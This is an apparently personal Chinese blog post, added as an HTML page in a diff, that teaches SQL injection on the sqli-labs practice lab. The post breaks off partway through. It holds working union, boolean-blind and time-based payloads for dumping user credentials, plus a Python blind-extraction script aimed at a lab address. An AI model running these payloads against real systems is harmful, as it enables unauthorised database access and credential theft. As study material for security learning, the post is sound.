@@ -1,0 +1,1528 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 \u200b 进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。 一、什么是sql注入 \u200b 通过恶意构造sql语句来获">
+<title>SQL注入</title>
+
+<link rel='canonical' href='http://localhost:1313/p/sql%E6%B3%A8%E5%85%A5/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="SQL注入">
+<meta property='og:description' content="前言 \u200b 进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。 一、什么是sql注入 \u200b 通过恶意构造sql语句来获">
+<meta property='og:url' content='http://localhost:1313/p/sql%E6%B3%A8%E5%85%A5/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-18T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="SQL注入">
+<meta name="twitter:description" content="前言 \u200b 进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。 一、什么是sql注入 \u200b 通过恶意构造sql语句来获">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#一什么是sql注入">一、什么是sql注入</a></li>
+    <li><a href="#二sql注入的类别">二、sql注入的类别</a>
+      <ol>
+        <li><a href="#联合注入">联合注入</a></li>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#延时注入">延时注入</a></li>
+        <li><a href="#报错注入">报错注入</a></li>
+        <li><a href="#宽字节注入">宽字节注入</a></li>
+        <li><a href="#堆叠注入">堆叠注入</a></li>
+        <li><a href="#二次注入">二次注入</a></li>
+        <li><a href="#user-agent-注入">User-Agent 注入</a></li>
+        <li><a href="#sql万能钥匙">sql万能钥匙</a></li>
+      </ol>
+    </li>
+    <li><a href="#三sql绕过">三、sql绕过</a>
+      <ol>
+        <li><a href="#关键字绕过">关键字绕过</a></li>
+        <li><a href="#逗号绕过">逗号绕过</a></li>
+        <li><a href="#绕过空格">绕过空格</a></li>
+        <li><a href="#过滤等于号">过滤等于号</a></li>
+        <li><a href="#过滤大小等于号">过滤大小等于号</a></li>
+      </ol>
+    </li>
+    <li><a href="#四sql写马">四、sql写马</a></li>
+    <li><a href="#五sqlmap使用方式">五、sqlmap使用方式</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-07-18</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 9 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>​	进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。</p>
+<h2 id="一什么是sql注入">一、什么是sql注入
+</h2><p>​	通过恶意构造sql语句来获取数据库中的内容。</p>
+<h2 id="二sql注入的类别">二、sql注入的类别
+</h2><p>这里以sqli-labs为例</p>
+<h3 id="联合注入">联合注入
+</h3><p>用union进行联合查询，适合于有显示位的注入。</p>
+<p>首先用1&rsquo;闭合判断数字型还是字符型</p>
+<p>然后用order by查看列数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//字符型
+</span></span><span class="line"><span class="cl">?id=1&#39; order by 3--+
+</span></span><span class="line"><span class="cl">?id=1&#39; order by 4--+ #报错
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//数字型
+</span></span><span class="line"><span class="cl">?id=1 order by 3
+</span></span><span class="line"><span class="cl">?id=1 order by 4 #报错
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后查看数据库（版本version()）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1,2,database()   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">（-1使正常查询出错，显示出union查询的值）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-1&#39;union select 1,2,database()--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#security
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看表名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#emails,referers,uagents,users
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看列名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#Host,User......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select 1,2,group_concat(username ,id , password) from users
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-1&#39; union select 1,2,group_concat(username ,id , password) from users--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="布尔盲注">布尔盲注
+</h3><p>回显被削了，但是依旧有报错</p>
+<p>最讨厌布尔盲注，不会写脚本，就显得很菜</p>
+<p>爆数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select database()))&gt;9--+  无回显说明报错
+</span></span><span class="line"><span class="cl">?id=1&#39;and length((select database()))&lt;7--+  无回显
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">结合一下说明database为8字母
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select database()),1,1))=115--+
+</span></span><span class="line"><span class="cl">（截取database()的第一个字符开始，长度为一的字符串，并用ascii码表示。然后通过&gt;,&lt;,=和是否有回显 判断database确切的值）
+</span></span><span class="line"><span class="cl">（是需要写脚本爆破的）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来思路都是一样的</p>
+<p>爆表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+
+</span></span><span class="line"><span class="cl">判断所有表名字符长度。
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+
+</span></span><span class="line"><span class="cl">逐一判断表名
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20--+
+</span></span><span class="line"><span class="cl">判断所有字段名的长度
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99--+
+</span></span><span class="line"><span class="cl">逐一判断字段名。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and length((select group_concat(username,password) from users))&gt;109--+
+</span></span><span class="line"><span class="cl">判断字段内容长度
+</span></span><span class="line"><span class="cl">?id=1&#39; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+
+</span></span><span class="line"><span class="cl">逐一检测内容。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本（某道题目的payload，拿来抄一下，要用的话改一下payload和判断条件。还有url）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.183.1:63261&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 使用整数除法</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 根据需要切换payload</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;sElect%09group_concat(table_name)%09FRom%09infOrmation_schema.tables%09Where%09table_schema%09like%09database()&#34;#courses,secrets,students</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;sElect%09group_concat(column_name)%09FRom%09infOrmation_schema.columns%09Where%09table_name%09like%09&#39;secrets&#39;&#34;#id,secret_key,secret_value</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;sElect</span><span class="si">%09g</span><span class="s2">roup_concat(id,secret_key,secret_value)</span><span class="si">%09f</span><span class="s2">rom%09`secrets`&#34;</span>       <span class="c1">#这里here_is_flag要用反引号才行，单引号不行，反引号用于标识数据库、表、列等对象的名称。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 构造正确的URL字符串（注意去掉了末尾逗号）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">?student_name=Alice&#39;%09and%09Ord(mid((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">%23&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">current_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Alice&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] 当前结果: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] 当前结果: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="延时注入">延时注入
+</h3><p>比布尔盲注更讨厌</p>
+<p>无论输入啥，都显示You are in。。。</p>
+<p>只能用sleep判断你的payload是否真的打进去了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if(1=1,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">判断注入点（确定延时注入是可以打进去的）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if(length((select database()))&gt;9,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">和布尔盲注一样，需要知道database的长度
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">爆每个字符
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
